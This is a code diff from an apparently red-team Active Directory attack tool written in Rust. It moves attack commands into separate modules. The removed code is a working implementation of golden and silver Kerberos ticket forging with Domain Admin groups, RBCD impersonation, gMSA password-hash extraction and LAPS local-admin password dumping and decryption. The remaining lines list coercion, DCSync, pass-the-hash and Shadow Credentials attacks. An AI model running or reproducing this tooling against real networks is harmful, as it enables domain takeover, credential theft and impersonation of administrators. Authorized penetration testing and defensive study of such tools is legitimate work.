@@ -182,9 +182,9 @@ struct AutoArgs {
 #[derive(Subcommand)]
 enum EnumCmd {
     /// Enumerate domain users over SAMR (SMB named pipe).
-    Samr(SamrArgs),
+    Samr(attacks::samr::SamrArgs),
     /// Resolve a name to its SID over LSAT (\lsarpc).
-    Lsa(LsaArgs),
+    Lsa(attacks::lsa::LsaArgs),
     /// Sweep a network: live hosts, AD ports, and SMB signing (NTLM-relay targets).
     Net(NetArgs),
     /// Enumerate AD-integrated DNS zones + records over LDAP (adidnsdump-style).
@@ -285,16 +285,16 @@ enum AttackCmd {
     /// Kerberos password spray / user enumeration.
     Spray(attacks::spray::SprayArgs),
     /// LDAP abuse: add-spn / add-member / set-password / write-rbcd.
-    Abuse(AbuseArgs),
+    Abuse(attacks::abuse::AbuseArgs),
     /// Coerce the DC to authenticate to a listener (PetitPotam / MS-EFSR).
-    Coerce(CoerceArgs),
+    Coerce(attacks::coerce::CoerceArgs),
     /// Zerologon (CVE-2020-1472) SAFE detection over MS-NRPC — never resets the machine password.
     Zerologon(attacks::zerologon::ZerologonArgs),
     /// RBCD: S4U2Self + S4U2Proxy to impersonate a user to a target service.
-    Rbcd(RbcdArgs),
+    Rbcd(attacks::rbcd::RbcdArgs),
     /// Constrained delegation abuse: same S4U2Self+S4U2Proxy chain via a `msDS-AllowedToDelegateTo`
     /// account with protocol transition (impersonate any user to the allowed service).
-    Constrained(RbcdArgs),
+    Constrained(attacks::rbcd::RbcdArgs),
     /// Ask-TGT: get a TGT with a password and write a reusable ccache (Kerberos `-k` workflows).
     Asktgt(attacks::asktgt::AsktgtArgs),
     /// DCSync: replicate a target's secrets via DRSUAPI over a sealed RPC channel.
@@ -314,9 +314,9 @@ enum AttackCmd {
     /// Local secretsdump: reg-save SYSTEM+SAM, pull over C$, decrypt local NT hashes offline.
     Secretsdump(SecretsdumpArgs),
     /// Read a gMSA managed password over LDAP → NT hash (for accounts you may retrieve).
-    Gmsa(GmsaArgs),
+    Gmsa(attacks::gmsa::GmsaArgs),
     /// Read LAPS local-admin passwords (ms-Mcs-AdmPwd / msLAPS-Password) over LDAPS.
-    Laps(LapsArgs),
+    Laps(attacks::laps::LapsArgs),
     /// Execute a command over WinRM (WS-Man, 5985/HTTP, NTLM + message encryption).
     Winrm(WinrmArgs),
     /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
@@ -329,9 +329,9 @@ enum AttackCmd {
     #[command(name = "icpr-esc1")]
     IcprEsc1(IcprEsc1Args),
     /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
-    Golden(GoldenArgs),
+    Golden(attacks::golden::GoldenArgs),
     /// Silver ticket: forge a service ticket (TGS) for an SPN with the service account's AES256 key.
-    Silver(SilverArgs),
+    Silver(attacks::silver::SilverArgs),
     /// Pass-the-ticket (PtT): forge golden/silver → get a service ticket → Kerberos AP-REQ over
     /// SMB → authenticate (and optionally run a command as the impersonated identity).
     ///
@@ -347,7 +347,7 @@ enum AttackCmd {
     /// ESC4 — write a certificate template's attributes to make it ESC1-vulnerable.
     Esc4(attacks::esc4::Esc4Args),
     /// Shadow Credentials — thin alias over `attack abuse --action add-keycred` / `pkinit`.
-    Shadowcred(ShadowcredArgs),
+    Shadowcred(attacks::shadowcred::ShadowcredArgs),
     /// DCShadow — default: enumerate DCSync-capable principals. `--prep <name>` registers a rogue
     /// nTDSDSA under Configuration NC (phase 1 of the Le Toux DCShadow chain); `--cleanup <name>`
     /// removes it. Full push (phase 2) is not yet implemented.
@@ -410,70 +410,9 @@ struct PthArgs {
     command: Option<String>,
 }
 
-#[derive(Parser)]
-struct SilverArgs {
-    /// Kerberos realm (e.g. CORP.LOCAL).
-    #[arg(long)]
-    realm: String,
-    /// Service key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
-    #[arg(long)]
-    service_aes256: String,
-    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the service NT hash (legacy DCs).
-    #[arg(long)]
-    rc4: bool,
-    /// Target SPN (e.g. cifs/dc01.corp.local).
-    #[arg(long)]
-    spn: String,
-    /// Domain SID (S-1-5-21-a-b-c).
-    #[arg(long)]
-    domain_sid: String,
-    /// Identity to impersonate (default Administrator).
-    #[arg(long, default_value = "Administrator")]
-    user: String,
-    /// RID of the impersonated account (default 500).
-    #[arg(long, default_value_t = 500)]
-    rid: u32,
-    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
-    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
-    groups: Vec<u32>,
-    /// Write the forged service ticket to this ccache path.
-    #[arg(long)]
-    out: Option<String>,
-}
+// SilverArgs moved to attacks::silver in arch-0.
 
-#[derive(Parser)]
-struct GoldenArgs {
-    /// KDC host or IP.
-    #[arg(long)]
-    kdc: String,
-    /// Kerberos realm (e.g. CORP.LOCAL).
-    #[arg(long)]
-    realm: String,
-    /// krbtgt key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
-    #[arg(long)]
-    krbtgt_aes256: String,
-    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the krbtgt NT hash (legacy DCs).
-    #[arg(long)]
-    rc4: bool,
-    /// Domain SID (S-1-5-21-a-b-c).
-    #[arg(long)]
-    domain_sid: String,
-    /// Identity to impersonate (default Administrator).
-    #[arg(long, default_value = "Administrator")]
-    user: String,
-    /// RID of the impersonated account (default 500).
-    #[arg(long, default_value_t = 500)]
-    rid: u32,
-    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
-    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
-    groups: Vec<u32>,
-    /// Write the forged TGT to this ccache path.
-    #[arg(long)]
-    out: Option<String>,
-    /// Optional live acceptance proof: request a service ticket for this SPN with the forged TGT.
-    #[arg(long)]
-    verify_spn: Option<String>,
-}
+// GoldenArgs moved to attacks::golden in arch-0.
 
 #[derive(clap::ValueEnum, Clone, Debug, PartialEq, Eq)]
 enum EscVariant {
@@ -588,37 +527,9 @@ struct Esc1Args {
     kdc: Option<String>,
 }
 
-#[derive(Parser)]
-struct GmsaArgs {
-    /// LDAP URL (LDAPS required — the managed password is only returned over a sealed channel)
-    #[arg(long)]
-    url: String,
-    #[arg(long)]
-    user: String,
-    #[arg(long)]
-    password: String,
-    #[arg(long)]
-    insecure: bool,
-    /// gMSA sAMAccountName (e.g. gmsa_web$)
-    #[arg(long)]
-    target: String,
-}
+// GmsaArgs moved to attacks::gmsa in arch-0.
 
-#[derive(Parser)]
-struct LapsArgs {
-    /// LDAP URL (LDAPS required — the password is only returned over a sealed channel)
-    #[arg(long)]
-    url: String,
-    #[arg(long)]
-    user: String,
-    #[arg(long)]
-    password: String,
-    #[arg(long)]
-    insecure: bool,
-    /// Computer sAMAccountName to read (e.g. WIN11$). Omit to dump every LAPS password you can read.
-    #[arg(long)]
-    target: Option<String>,
-}
+// LapsArgs moved to attacks::laps in arch-0.
 
 #[derive(Parser)]
 struct DnsArgs {
@@ -799,187 +710,23 @@ struct DcsyncArgs {
 
 // Esc4Args moved to `attacks::esc4` in arch-0.
 
-#[derive(Parser)]
-struct ShadowcredArgs {
-    #[arg(long)]
-    url: String,
-    #[arg(long)]
-    user: String,
-    #[arg(long)]
-    password: String,
-    #[arg(long)]
-    insecure: bool,
-    /// sAMAccountName to plant the KeyCredential on.
-    #[arg(long)]
-    target: String,
-    /// If set, also perform PKINIT with the fresh key and print the ccache path.
-    #[arg(long)]
-    pkinit: bool,
-    /// KDC `host[:port]` (required with --pkinit).
-    #[arg(long)]
-    kdc: Option<String>,
-    #[arg(long)]
-    realm: Option<String>,
-}
+// ShadowcredArgs moved to attacks::shadowcred in arch-0.
 
-#[derive(Parser)]
-struct RbcdArgs {
-    #[arg(long)]
-    kdc: String,
-    #[arg(long)]
-    realm: String,
-    /// Controlled account (the RBCD trustee) sAMAccountName
-    #[arg(long)]
-    account: String,
-    /// Controlled account password
-    #[arg(long)]
-    account_password: String,
-    /// User to impersonate, e.g. Administrator
-    #[arg(long)]
-    impersonate: String,
-    /// Target service SPN, e.g. cifs/dc01.corp.local
-    #[arg(long)]
-    target_spn: String,
-}
+// RbcdArgs moved to attacks::rbcd in arch-0.
 
-/// Coercion vector (pipe) selection for `attack coerce`.
-///
-/// Renamed from a bare `--pipe <string>` in 1.3.10 — clap now rejects
-/// unknown values at parse time with a helpful list, instead of silently
-/// forwarding through to `smb.open_pipe` where the failure surfaces as a
-/// generic RPC fault a hundred lines later.
-#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
-enum CoercePipe {
-    /// PrinterBug (MS-RPRN over \spoolss) — most reliable coercion on modern DCs.
-    Spoolss,
-    /// PetitPotam (MS-EFSR over \lsarpc) — restricted on Server 2016+ hardened DCs.
-    Lsarpc,
-    /// PetitPotam (MS-EFSR over \efsrpc) — restricted on Server 2016+ hardened DCs.
-    Efsrpc,
-    /// DFSCoerce (MS-DFSNM NetrDfsAddStdRoot over \netdfs).
-    Netdfs,
-    /// ShadowyCoerce (MS-FSRVP IsPathSupported over \FssagentRpc) — needs FS-VSS-Agent role.
-    Fssagentrpc,
-}
+// CoercePipe moved to attacks::coerce in arch-0.
 
-#[derive(Parser)]
-struct CoerceArgs {
-    #[arg(long)]
-    host: String,
-    #[arg(long)]
-    domain: String,
-    #[arg(long)]
-    user: String,
-    #[arg(long)]
-    password: String,
-    /// Attacker host the DC should authenticate to (UNC target)
-    #[arg(long)]
-    listener: String,
-    /// Coercion vector (pipe name): spoolss (PrinterBug, MS-RPRN — most reliable on modern
-    /// DCs), lsarpc / efsrpc (PetitPotam, MS-EFSR — restricted on 2016+), netdfs (DFSCoerce,
-    /// MS-DFSNM), fssagentrpc (ShadowyCoerce, MS-FSRVP — needs FS-VSS-Agent role).
-    #[arg(long, value_enum, ignore_case = true, default_value = "spoolss")]
-    pipe: CoercePipe,
-    /// PrinterBug server name to open (defaults to --host; modern spoolers want the hostname/FQDN, not an IP)
-    #[arg(long)]
-    target: Option<String>,
-}
+// CoerceArgs moved to attacks::coerce in arch-0.
 
-/// LDAP-write / KDC abuse action for `attack abuse`.
-///
-/// Replaced a bare `--action <string>` in 1.3.10 — clap now rejects unknown
-/// actions at parse time instead of running an LDAP bind first only to fail
-/// with "unknown action 'foo'" later.
-#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
-pub enum AbuseAction {
-    /// Add a servicePrincipalName to the target → makes it Kerberoastable.
-    AddSpn,
-    /// Add the given user to the target group.
-    AddMember,
-    /// Reset the target account's password (requires LDAPS or --gssapi sealing).
-    SetPassword,
-    /// Shadow Credentials: add a KeyCredential to msDS-KeyCredentialLink.
-    AddKeycred,
-    /// Write RBCD: allow --value to impersonate to the target (msDS-AllowedToActOnBehalfOfOtherIdentity).
-    WriteRbcd,
-    /// PKINIT with a previously issued Shadow Credentials key → TGT as the target account.
-    Pkinit,
-}
+// AbuseAction moved to attacks::abuse in arch-0.
 
-#[derive(Parser)]
-struct AbuseArgs {
-    /// LDAP URL (required for the LDAP-write actions; unused by `pkinit`)
-    #[arg(long)]
-    url: Option<String>,
-    #[arg(long)]
-    user: Option<String>,
-    #[arg(long)]
-    password: Option<String>,
-    #[arg(long)]
-    insecure: bool,
-    /// Which abuse to perform.
-    #[arg(long)]
-    action: AbuseAction,
-    /// Target sAMAccountName (the object to modify; the group for add-member; the account
-    /// to authenticate as for `pkinit`)
-    #[arg(long)]
-    target: String,
-    /// Value: the SPN, member sAMAccountName, new password, RBCD trustee, or (for `pkinit`)
-    /// the key .pem path — defaults to `<target>.key.pem`
-    #[arg(long, default_value = "")]
-    value: String,
-    /// Kerberos realm (pkinit); also the AD DNS domain for --ldap389 base DN
-    #[arg(long)]
-    realm: Option<String>,
-    /// KDC `host[:port]` (pkinit)
-    #[arg(long)]
-    kdc: Option<String>,
-    /// add-keycred over raw LDAP-389 + NTLM SASL bind (no LDAPS) — needs --host + --realm
-    #[arg(long)]
-    ldap389: bool,
-    /// DC host for --ldap389
-    #[arg(long)]
-    host: Option<String>,
-}
+// AbuseArgs moved to attacks::abuse in arch-0.
 
 // SprayArgs moved to `attacks::spray` in arch-0.
 
-#[derive(Parser)]
-struct LsaArgs {
-    #[arg(long)]
-    host: String,
-    #[arg(long)]
-    domain: String,
-    #[arg(long)]
-    user: String,
-    #[arg(long, default_value = "")]
-    password: String,
-    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
-    #[arg(long)]
-    nt_hash: Option<String>,
-    /// Name to resolve to a SID, e.g. Administrator
-    #[arg(long)]
-    name: String,
-}
+// LsaArgs moved to attacks::lsa in arch-0.
 
-#[derive(Parser)]
-struct SamrArgs {
-    /// DC host or IP
-    #[arg(long)]
-    host: String,
-    /// NetBIOS domain, e.g. CORP
-    #[arg(long)]
-    domain: String,
-    /// Username (sAMAccountName)
-    #[arg(long)]
-    user: String,
-    /// Password
-    #[arg(long, default_value = "")]
-    password: String,
-    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
-    #[arg(long)]
-    nt_hash: Option<String>,
-}
+// SamrArgs moved to attacks::samr in arch-0.
 
 #[derive(Parser)]
 struct ScanArgs {
@@ -1130,8 +877,8 @@ fn cmd_label(cmd: &Command) -> &'static str {
 async fn dispatch(cmd: Command) -> Result<()> {
     match cmd {
         Command::Scan(a) => scan(a).await,
-        Command::Enum(EnumCmd::Samr(a)) => samr(a).await,
-        Command::Enum(EnumCmd::Lsa(a)) => lsa(a).await,
+        Command::Enum(EnumCmd::Samr(a)) => attacks::samr::samr(a).await,
+        Command::Enum(EnumCmd::Lsa(a)) => attacks::lsa::lsa(a).await,
         Command::Enum(EnumCmd::Net(a)) => netenum(a).await,
         Command::Enum(EnumCmd::Dns(a)) => dnsenum(a).await,
         Command::Enum(EnumCmd::Adcs(a)) => adcsenum(a).await,
@@ -1142,11 +889,11 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Enum(EnumCmd::Hku(a)) => hku_enum(a).await,
         Command::Attack(AttackCmd::Roast(a)) => roast(a).await,
         Command::Attack(AttackCmd::Spray(a)) => attacks::spray::spray(a).await,
-        Command::Attack(AttackCmd::Abuse(a)) => abuse(a).await,
-        Command::Attack(AttackCmd::Coerce(a)) => coerce(a).await,
+        Command::Attack(AttackCmd::Abuse(a)) => attacks::abuse::abuse(a).await,
+        Command::Attack(AttackCmd::Coerce(a)) => attacks::coerce::coerce(a).await,
         Command::Attack(AttackCmd::Zerologon(a)) => attacks::zerologon::zerologon(a).await,
-        Command::Attack(AttackCmd::Rbcd(a)) => rbcd(a).await,
-        Command::Attack(AttackCmd::Constrained(a)) => rbcd(a).await,
+        Command::Attack(AttackCmd::Rbcd(a)) => attacks::rbcd::rbcd(a).await,
+        Command::Attack(AttackCmd::Constrained(a)) => attacks::rbcd::rbcd(a).await,
         Command::Attack(AttackCmd::Asktgt(a)) => attacks::asktgt::asktgt(a).await,
         Command::Attack(AttackCmd::Dcsync(a)) => dcsync(a).await,
         Command::Attack(AttackCmd::Capture(a)) => smb2_client::server::capture(&a.listen)
@@ -1158,13 +905,13 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Atexec(a)) => atexec_cmd(a).await,
         Command::Attack(AttackCmd::Wmiexec(a)) => wmiexec_cmd(a).await,
         Command::Attack(AttackCmd::Secretsdump(a)) => secretsdump(a).await,
-        Command::Attack(AttackCmd::Gmsa(a)) => gmsa(a).await,
-        Command::Attack(AttackCmd::Laps(a)) => laps(a).await,
+        Command::Attack(AttackCmd::Gmsa(a)) => attacks::gmsa::gmsa(a).await,
+        Command::Attack(AttackCmd::Laps(a)) => attacks::laps::laps(a).await,
         Command::Attack(AttackCmd::Winrm(a)) => winrm_exec(a).await,
         Command::Attack(AttackCmd::Esc1(a)) => esc1(a).await,
         Command::Attack(AttackCmd::IcprEsc1(a)) => icpr_esc1(a).await,
-        Command::Attack(AttackCmd::Golden(a)) => golden(a).await,
-        Command::Attack(AttackCmd::Silver(a)) => silver(a).await,
+        Command::Attack(AttackCmd::Golden(a)) => attacks::golden::golden(a).await,
+        Command::Attack(AttackCmd::Silver(a)) => attacks::silver::silver(a).await,
         Command::Attack(AttackCmd::Ptt(a)) => {
             // Emit the deprecation notice when the operator reached us through the `pth` alias.
             if std::env::args().any(|a| a == "pth") {
@@ -1178,7 +925,7 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Unconstrained(a)) => attacks::unconstrained::unconstrained(a).await,
         Command::Attack(AttackCmd::Badsuccessor(a)) => attacks::badsuccessor::badsuccessor(a).await,
         Command::Attack(AttackCmd::Esc4(a)) => attacks::esc4::esc4(a).await,
-        Command::Attack(AttackCmd::Shadowcred(a)) => shadowcred(a).await,
+        Command::Attack(AttackCmd::Shadowcred(a)) => attacks::shadowcred::shadowcred(a).await,
         Command::Attack(AttackCmd::Dcshadow(a)) => dcshadow(a).await,
         Command::Check(CheckCmd::Adcs(a)) => check_adcs(a).await,
         Command::Dump(DumpCmd::Laps(a)) => dump_laps(a).await,
@@ -1202,24 +949,7 @@ async fn dispatch(cmd: Command) -> Result<()> {
     }
 }
 
-/// Full RBCD attack: S4U2Self + S4U2Proxy to obtain an impersonation ticket to the target.
-async fn rbcd(a: RbcdArgs) -> Result<()> {
-    let etype = adhammer_kerberos::rbcd_impersonate(
-        &a.account,
-        &a.account_password,
-        &a.realm,
-        &a.kdc,
-        &a.impersonate,
-        &a.target_spn,
-    )
-    .await?;
-    println!(
-        "[+] got service ticket for {} as {} (enc-part etype {etype})",
-        a.target_spn, a.impersonate
-    );
-    println!("    RBCD chain succeeded — impersonation ticket obtained.");
-    Ok(())
-}
+// fn rbcd moved to attacks::rbcd in arch-0.
 
 // fn asktgt moved to `attacks::asktgt` in arch-0.
 /// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
@@ -1492,7 +1222,7 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
 /// 3. `$ADHAMMER_PASSWORD` env var.
 /// 4. Interactive prompt (only when stdin is a TTY) via `dialoguer::Password`.
 /// 5. Empty string — downstream code returns its own "needs password" error.
-fn resolve_secret(argv_value: &str, env_key: &str) -> Result<String> {
+pub(crate) fn resolve_secret(argv_value: &str, env_key: &str) -> Result<String> {
     if let Some(path) = argv_value.strip_prefix("@file:") {
         let raw =
             std::fs::read_to_string(path).with_context(|| format!("read password file {path}"))?;
@@ -1586,7 +1316,7 @@ pub(crate) fn parse_nt_hash(s: &str) -> Result<[u8; 16]> {
 }
 
 /// Parse a ticket-forging key: a 16-byte NT hash (32 hex) for RC4, else a 32-byte AES256 key.
-fn parse_forge_key(s: &str, rc4: bool) -> Result<Vec<u8>> {
+pub(crate) fn parse_forge_key(s: &str, rc4: bool) -> Result<Vec<u8>> {
     let raw = hex::decode(s.trim()).context("forge key must be hex")?;
     let want = if rc4 { 16 } else { 32 };
     anyhow::ensure!(
@@ -1600,7 +1330,7 @@ fn parse_forge_key(s: &str, rc4: bool) -> Result<Vec<u8>> {
 }
 
 /// SMB login with either a password or an NT hash (pass-the-hash).
-async fn smb_login(
+pub(crate) async fn smb_login(
     smb: &mut smb2_client::SmbClient,
     host: &str,
     domain: &str,
@@ -2115,89 +1845,9 @@ async fn esc1(a: Esc1Args) -> Result<()> {
     Ok(())
 }
 
-/// Golden ticket: forge a TGT for an arbitrary identity, sealed + double-signed with the domain's
-/// krbtgt AES256 key. Accepted by fully-patched (KB5020805) KDCs because the forged PAC carries a
-/// valid KDC signature plus PAC_REQUESTOR/PAC_ATTRIBUTES.
-async fn golden(a: GoldenArgs) -> Result<()> {
-    use adhammer_kerberos::pac::ForgeIdentity;
+// fn golden moved to attacks::golden in arch-0.
 
-    let key = parse_forge_key(&a.krbtgt_aes256, a.rc4)?;
-    let subs: Vec<u32> = a
-        .domain_sid
-        .trim_start_matches("S-1-5-")
-        .split('-')
-        .map(|x| x.parse::<u32>())
-        .collect::<std::result::Result<_, _>>()
-        .context("--domain-sid must be S-1-5-21-a-b-c")?;
-
-    let id = ForgeIdentity {
-        user: a.user.clone(),
-        rid: a.rid,
-        primary_gid: 513,
-        group_rids: a.groups.clone(),
-        domain_subauths: subs,
-        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
-        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
-    };
-    let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
-    println!(
-        "[+] forged golden TGT: {}@{} (rid {}, groups {:?})",
-        a.user, a.realm, a.rid, a.groups
-    );
-
-    if let Some(spn) = &a.verify_spn {
-        match adhammer_kerberos::roast_spn(&tgt, &a.user, spn, &a.kdc).await {
-            Ok(_) => println!("[+] KDC accepted the golden ticket (TGS-REP for {spn})"),
-            Err(e) => println!("[-] KDC rejected the golden ticket for {spn}: {e}"),
-        }
-    }
-    if let Some(out) = &a.out {
-        let cc = adhammer_kerberos::golden_ccache(&tgt, &a.user)?;
-        std::fs::write(out, &cc)?;
-        println!(
-            "[+] wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
-            cc.len()
-        );
-    }
-    Ok(())
-}
-
-/// Silver ticket: forge a service ticket (TGS) for an SPN, sealed + PAC-signed with the target
-/// service account's AES256 key. Presented directly to the service (AP-REQ) without the KDC —
-/// so the KDC signature is unchecked. Emits a ccache for use with `-k` / KRB5CCNAME tooling.
-async fn silver(a: SilverArgs) -> Result<()> {
-    use adhammer_kerberos::pac::ForgeIdentity;
-
-    let key = parse_forge_key(&a.service_aes256, a.rc4)?;
-    let subs: Vec<u32> = a
-        .domain_sid
-        .trim_start_matches("S-1-5-")
-        .split('-')
-        .map(|x| x.parse::<u32>())
-        .collect::<std::result::Result<_, _>>()
-        .context("--domain-sid must be S-1-5-21-a-b-c")?;
-
-    let id = ForgeIdentity {
-        user: a.user.clone(),
-        rid: a.rid,
-        primary_gid: 513,
-        group_rids: a.groups.clone(),
-        domain_subauths: subs,
-        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
-        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
-    };
-    let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &a.spn, a.rc4)?;
-    println!(
-        "[+] forged silver ticket: {}@{} for {} (rid {})",
-        a.user, a.realm, a.spn, a.rid
-    );
-    if let Some(out) = &a.out {
-        let cc = adhammer_kerberos::silver_ccache(&tgt, &a.user, &a.spn)?;
-        std::fs::write(out, &cc)?;
-        println!("[+] wrote ccache → {out} ({} bytes)", cc.len());
-    }
-    Ok(())
-}
+// fn silver moved to attacks::silver in arch-0.
 
 /// Pass-the-ticket: forge a golden or silver ticket, obtain a service ticket for the SPN, and
 /// authenticate to SMB with a Kerberos AP-REQ — then optionally run a command as the impersonated
@@ -2289,193 +1939,9 @@ async fn pth(a: PthArgs) -> Result<()> {
     Ok(())
 }
 
-/// Read a gMSA's managed password over LDAP and derive its NT hash. The managed password is a
-/// constructed attribute the DC returns only over a sealed channel (LDAPS here) to principals in
-/// `msDS-GroupMSAMembership`. Output is PtH/hashcat-usable.
-async fn gmsa(mut a: GmsaArgs) -> Result<()> {
-    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    use adhammer_collector::{Collector, LdapConfig};
-    // msDS-ManagedPassword is a "confidential" attribute — AD returns it *only* over an
-    // encrypted channel (LDAPS or sealed SASL). Fail fast with a clear message rather than
-    // let ldap3 surface a raw `UNABLE_TO_PROCEED` from the server.
-    if a.url.starts_with("ldap://") {
-        anyhow::bail!(
-            "gMSA managed-password read needs an encrypted channel — use `ldaps://` \
-             (add --insecure for self-signed). Plain ldap:// will return \
-             UNABLE_TO_PROCEED even for an authorized reader."
-        );
-    }
-    let cfg = LdapConfig {
-        url: a.url.clone(),
-        bind_dn: a.user.clone(),
-        password: a.password.clone(),
-        base_dn: None,
-        insecure: a.insecure,
-        gssapi: false,
-    };
-    let mut c = Collector::connect(&cfg).await?;
-    let blob = c
-        .read_attr_bin(&a.target, "msDS-ManagedPassword")
-        .await
-        .with_context(|| {
-            format!(
-                "read msDS-ManagedPassword on '{}' — is it a gMSA? is the bind identity in \
-                 PrincipalsAllowedToRetrieveManagedPassword?",
-                a.target
-            )
-        })?
-        .with_context(|| {
-            format!(
-                "'{}' returned no msDS-ManagedPassword (not a gMSA, or the bind identity \
-                 isn't allowed to retrieve it)",
-                a.target
-            )
-        })?;
-    let pw = parse_managed_password_blob(&blob).context("parse MSDS-MANAGEDPASSWORD_BLOB")?;
-    let nt = ntlmssp::md4(&pw);
-    let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
-    // secretsdump-style line; the RID is unknown here, so print sam + hash.
-    println!("{}:aad3b435b51404eeaad3b435b51404ee:{}:::", a.target, nthex);
-    eprintln!(
-        "[+] gMSA {} current-password NT hash recovered ({} blob bytes)",
-        a.target,
-        blob.len()
-    );
-    Ok(())
-}
+// fn gmsa moved to attacks::gmsa in arch-0.
 
-/// Read LAPS local-administrator passwords over LDAPS — one host (`--target WIN11$`) or every
-/// computer whose LAPS attribute the bind identity can read. Ubiquitous instant-local-admin;
-/// chain the cleartext into `attack exec`/`secretsdump` as the local Administrator.
-/// Decrypt a raw `msLAPS-EncryptedPassword` blob via MS-GKDI `GetKey` against the DC. Returns
-/// (account name, cleartext password) on success. The GKDI RPC is sealed — the DC only hands
-/// out the group key if the bind identity is authorized to read the LAPS password.
-async fn decrypt_encrypted_laps(
-    dc_host: &str,
-    domain: &str,
-    user: &str,
-    password: &str,
-    laps_attr_value: &[u8],
-) -> Result<(String, String)> {
-    use dpapi_ng::{decrypt, laps_password_from_json, rpc, LapsBlob};
-
-    let laps = LapsBlob::parse(laps_attr_value)
-        .map_err(|e| anyhow::anyhow!("parse LAPS header: {e:?}"))?;
-    let protected = laps
-        .protected()
-        .map_err(|e| anyhow::anyhow!("parse CMS ProtectedBlob: {e:?}"))?;
-    let id = &protected.key_identifier;
-    let envelope = rpc::get_key(
-        dc_host,
-        domain,
-        user,
-        password,
-        &[], // empty target SD — DC uses the requestor's context (dploot/netexec default)
-        Some(id.root_key_id),
-        id.l0,
-        id.l1,
-        id.l2,
-    )
-    .await
-    .map_err(|e| anyhow::anyhow!("GKDI GetKey: {e}"))?;
-    let plaintext_utf16 =
-        decrypt(&protected, &envelope).map_err(|e| anyhow::anyhow!("DPAPI-NG decrypt: {e:?}"))?;
-    // Windows LAPS stores `{"n":"<account>","t":"<hex>","p":"<pw>"}` as UTF-16LE.
-    let pw = laps_password_from_json(&plaintext_utf16)
-        .ok_or_else(|| anyhow::anyhow!("decrypted blob has no 'p' field"))?;
-    let account = {
-        let json = String::from_utf16_lossy(
-            &plaintext_utf16
-                .chunks_exact(2)
-                .map(|c| u16::from_le_bytes([c[0], c[1]]))
-                .collect::<Vec<_>>(),
-        );
-        json.find("\"n\"")
-            .and_then(|at| json[at + 3..].find('"').map(|s| at + 3 + s + 1))
-            .and_then(|s| json[s..].find('"').map(|e| json[s..s + e].to_string()))
-            .unwrap_or_else(|| "Administrator".into())
-    };
-    Ok((account, pw))
-}
-
-async fn laps(mut a: LapsArgs) -> Result<()> {
-    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    use adhammer_collector::{Collector, LdapConfig};
-    let cfg = LdapConfig {
-        url: a.url.clone(),
-        bind_dn: a.user.clone(),
-        password: a.password.clone(),
-        base_dn: None,
-        insecure: a.insecure,
-        gssapi: false,
-    };
-    let sp = ui::Spinner::start("reading LAPS passwords over LDAPS");
-    let mut c = Collector::connect(&cfg).await?;
-    let entries = c.read_laps(a.target.as_deref()).await?;
-    sp.done(&format!("{} LAPS entr(y/ies) returned", entries.len()));
-    if entries.is_empty() {
-        anyhow::bail!(
-            "no LAPS password readable (no LAPS deployed, or the bind identity lacks the read right — try a specific --target <HOST$>)"
-        );
-    }
-
-    // For encrypted LAPS we need a KDC hostname + a DOMAIN\user bind for the sealed GKDI
-    // GetKey RPC. Both are derived from the LDAP config we already have.
-    let dc_host = a
-        .url
-        .trim_start_matches("ldaps://")
-        .trim_start_matches("ldap://")
-        .split('/')
-        .next()
-        .unwrap_or("")
-        .split(':')
-        .next()
-        .unwrap_or("")
-        .to_string();
-    let (domain, user) = a
-        .user
-        .split_once('\\')
-        .map(|(d, u)| (d.to_string(), u.to_string()))
-        .unwrap_or_else(|| (String::new(), a.user.clone()));
-
-    let mut cleartext = 0usize;
-    for e in &entries {
-        if let Some(pw) = &e.password {
-            cleartext += 1;
-            let exp = e
-                .expires
-                .as_deref()
-                .map(|x| format!("  expires={x}"))
-                .unwrap_or_default();
-            // TAB-separated: HOST$  account  password  [expires]
-            println!("{}\t{}\t{}{}", e.sam, e.account, pw, exp);
-            continue;
-        }
-        // Encrypted-LAPS path: msLAPS-EncryptedPassword → LAPS header → CMS ProtectedBlob →
-        // MS-GKDI GetKey for the blob's KeyIdentifier → derive L2 key → open the blob.
-        let Some(bytes) = &e.encrypted_blob else {
-            eprintln!(
-                "[!] {}: no cleartext and no encrypted blob to work with",
-                e.sam
-            );
-            continue;
-        };
-        match decrypt_encrypted_laps(&dc_host, &domain, &user, &a.password, bytes).await {
-            Ok((account, pw)) => {
-                cleartext += 1;
-                println!("{}\t{}\t{}", e.sam, account, pw);
-            }
-            Err(err) => eprintln!(
-                "[!] {} DPAPI-NG decrypt failed: {err} (bind identity may lack the GKDI read right)",
-                e.sam
-            ),
-        }
-    }
-    ui::ok(&format!(
-        "LAPS: {cleartext} cleartext local-admin password(s) recovered"
-    ));
-    Ok(())
-}
